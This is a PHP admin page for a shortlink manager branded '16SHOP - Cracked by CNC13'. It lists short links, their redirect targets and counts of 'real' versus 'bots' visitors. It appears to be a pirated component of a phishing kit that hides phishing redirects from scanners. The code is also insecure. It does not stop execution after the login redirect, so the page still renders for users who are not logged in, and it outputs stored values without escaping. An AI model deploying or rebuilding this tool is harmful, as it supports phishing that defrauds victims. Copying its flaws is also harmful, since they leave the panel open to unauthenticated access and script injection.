<?php
error_reporting(0);
session_start();
if(!file_exists("../key.ini")) {
    header("location: setup.php");
    exit();
}
if(!isset($_SESSION['email_admin'])) {
    header("location: login.php");
}
function count_c($filename) {
    $file = fopen($filename, "r");
    $total_click = fread($file, filesize($filename));
    $total_click = substr_count($total_click, "\n");
    return $total_click;
    fclose($file);
}
function getDirContents($dir, &$results = array()) {
    $files = scandir($dir);

    foreach ($files as $key => $value) {
        $path = realpath($dir . DIRECTORY_SEPARATOR . $value);
        if (!is_dir($path)) {
            $results[] = $path;
        } else if ($value != "." && $value != "..") {
            getDirContents($path, $results);
            $results[] = $path;
        }
    }

    return $results;
}
$list = getDirContents('../db/url/');
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Required meta tags-->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="au theme template">
    <meta name="author" content="Hau Nguyen">
    <meta name="keywords" content="au theme template">

    <title>16Short Manager - Cracked by CNC13</title>
    <link href="css/font-face.css" rel="stylesheet" media="all">
    <link href="vendor/font-awesome-4.7/css/font-awesome.min.css" rel="stylesheet" media="all">
    <link href="vendor/font-awesome-5/css/fontawesome-all.min.css" rel="stylesheet" media="all">
    <link href="vendor/mdi-font/css/material-design-iconic-font.min.css" rel="stylesheet" media="all">
    <link href="vendor/css-hamburgers/hamburgers.min.css" rel="stylesheet" media="all">

    <!-- Bootstrap CSS-->
    <link href="vendor/bootstrap-4.1/bootstrap.min.css" rel="stylesheet" media="all">

    <!-- Vendor CSS-->
    <link href="vendor/animsition/animsition.min.css" rel="stylesheet" media="all">
    

    <!-- Main CSS-->
    <link href="css/theme.css" rel="stylesheet" media="all">

</head>

<body class="animsition">
    <div class="page-wrapper">
        <!-- HEADER MOBILE-->
        <header class="header-mobile d-block d-lg-none">
            <div class="header-mobile__bar">
                <div class="container-fluid">
                    <div class="header-mobile-inner">
                        <h3>16SHOP - Cracked by CNC13</h3>
                        <button class="hamburger hamburger--slider" type="button">
                            <span class="hamburger-box">
                                <span class="hamburger-inner"></span>
                            </span>
                        </button>
                    </div>
                </div>
            </div>
            <nav class="navbar-mobile">
                <div class="container-fluid">
                    <ul class="navbar-mobile__list list-unstyled">
                        <li class="active has-sub">
                            <a class="js-arrow" href="index.php">
                                <i class="fas fa-cog"></i>Shortlink</a>
                           
                        </li>
                       
                        <li>
                            <a href="logout.php">
                                <i class="fas fa-power-off"></i>Logout</a>
                        </li>
                    </ul>
                </div>
            </nav>
        </header>
        <!-- END HEADER MOBILE-->

        <!-- MENU SIDEBAR-->
        <aside class="menu-sidebar d-none d-lg-block">
            <div class="logo">
                <h3>16SHOP - Cracked by CNC13</h3>
            </div>
            <div class="menu-sidebar__content js-scrollbar1">
                <nav class="navbar-sidebar">
                    <ul class="list-unstyled navbar__list">
                        <li class="active has-sub">
                            <a class="js-arrow" href="#">
                                <i class="fas fa-cog"></i>Shortlink</a>
                           
                        </li>
                        
  
                        <li>
                            <a href="logout.php">
                                <i class="fas fa-power-off"></i>Logout</a>
                        </li>
                       
                    </ul>
                </nav>
            </div>
        </aside>
        <!-- END MENU SIDEBAR-->

        <!-- PAGE CONTAINER-->
        <div class="page-container">
            <!-- HEADER DESKTOP-->
            <header class="header-desktop">
                <div class="section__content section__content--p30">
                    <div class="container-fluid">
                        <div class="header-wrap">
                            
                            <div class="header-button">
                                <div class="noti-wrap">
                                    
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </header>
            <!-- HEADER DESKTOP-->

            <!-- MAIN CONTENT-->
            <div class="main-content">
                <div class="section__content section__content--p30">
                    <div class="container-fluid">
                       
                        <div class="row">
                            <div class="col-lg-12">
                                <h2 class="title-1 m-b-25">Shortlink <a href="add.php" style="float:right;" class="btn btn-primary m-l-10 m-b-10" href="">Add URL</a></h2>
                                
                              <div class="table--no-card m-b-40" style="max-height: 500px;overflow:scroll;">
                                    <table class="table table-borderless table-data3">
                                        <thead>
                                            <tr>
                                                <th>URL Shortlink</th>
                                              <th>Redirect</th>
                                              <th>Real</th>
                                              <th>Blocked</th>                
                          <th>ACTION</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                          <?php
                                          if(count($list) == 0) {
                                            echo "<tr><td>URL Not Found</td><td></td><td></td><td></td><td></td></tr>";
                                          }
                                          foreach($list as $data) {
                                            $set = parse_ini_file("../db/url/".basename($data));
                                            echo '<tr>
                            <td><a target="_blank" href="https://'.$_SERVER['HTTP_HOST'].'/'.basename($data,".ini").'">'.$_SERVER['HTTP_HOST'].'/'.basename($data,".ini").'</a></td>
                            <td><a target="_blank" href="'.$set["url"].'">'.$set["url"].'</a></td>
                            <td>'.count_c("../logs/".basename($data,".ini")."-real.txt").'</td>
                            <td>'.count_c("../logs/".basename($data,".ini")."-bots.txt").'</td>
                            <td><a style="margin-left:10px;text-decoration:none;color:#000;float:right;" href="delete.php?code='.basename($data,".ini").'" class="icon"><i class="fas fa-trash-alt"></i></a><a style="margin-left:10px;text-decoration:none;color:#000;float:right;" href="modify.php?code='.basename($data,".ini").'" class="icon"><i class="fas fa-cog"></i></a> <a style="margin-left:10px;text-decoration:none;color:#000;float:right;" href="stats.php?code='.basename($data,".ini").'" class="icon"><i class="fas fa-chart-bar"></i></a></td>
                          </tr>';
                                          }
                                            ?>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                            
                        
                        <div class="row">
                            <div class="col-md-12">
                                
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- END MAIN CONTENT-->
            <!-- END PAGE CONTAINER-->
        </div>

    </div>

    <!-- Jquery JS-->
    <script src="vendor/jquery-3.2.1.min.js"></script>
    <!-- Bootstrap JS-->
    <script src="vendor/bootstrap-4.1/popper.min.js"></script>
    <script src="vendor/bootstrap-4.1/bootstrap.min.js"></script>
    <!-- Vendor JS       -->
    <script src="vendor/slick/slick.min.js">
    </script>
    <script src="vendor/wow/wow.min.js"></script>
    <script src="vendor/animsition/animsition.min.js"></script>
    <script src="vendor/bootstrap-progressbar/bootstrap-progressbar.min.js">
    </script>
    <script src="vendor/counter-up/jquery.waypoints.min.js"></script>
    <script src="vendor/counter-up/jquery.counterup.min.js">
    </script>
    <script src="vendor/circle-progress/circle-progress.min.js"></script>
    <script src="vendor/perfect-scrollbar/perfect-scrollbar.js"></script>
    <script src="vendor/chartjs/Chart.bundle.min.js"></script>
    <script src="vendor/select2/select2.min.js">
    </script>

    <!-- Main JS-->
    <script src="js/main.js"></script>

</body>

</html>
<!-- end document-->
